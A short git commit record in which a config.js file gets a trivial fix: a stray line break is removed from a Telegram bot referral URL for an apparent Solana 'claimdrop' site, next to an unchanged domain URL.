326dab19e36088fddf19ae65bc6256a4a8d51eab
maks <gullets-mighty-0i@icloud.com>
2025-05-22 00:56:46 +0300

    updete config

--- config.js
+++ config.js
@@ -1,3 +1,2 @@
 window.domainUrl = "https://connect.sol-node.com";
-window.botUrl = "https://t.me/Sol_claimdrop_bot?start=ref491553356
-";
+window.botUrl = "https://t.me/Sol_claimdrop_bot?start=ref491553356";
